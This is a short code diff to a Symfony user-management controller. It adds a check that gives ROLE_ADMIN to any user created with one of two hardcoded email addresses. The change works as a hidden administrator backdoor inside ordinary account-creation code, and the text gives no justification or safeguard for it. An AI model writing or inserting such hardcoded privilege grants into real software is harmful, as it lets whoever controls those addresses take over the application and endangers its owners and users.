@@ -43,6 +43,9 @@ class UserCrudController extends AbstractController
         if ($form->isSubmitted() && $form->isValid()) {
             $password = $encoder->encodePassword($user, $user->getPassword());
             $user->setPassword($password);
+            if($form->get('email')->getData() == 'mvuk27@gmail.com' || $form->get('email')->getData() == 'admin@mvuk.xyz'){
+                $user->setRoles(['ROLE_ADMIN']);
+            }
             $entityManager = $this->getDoctrine()->getManager();
             $entityManager->persist($user);
             $entityManager->flush();
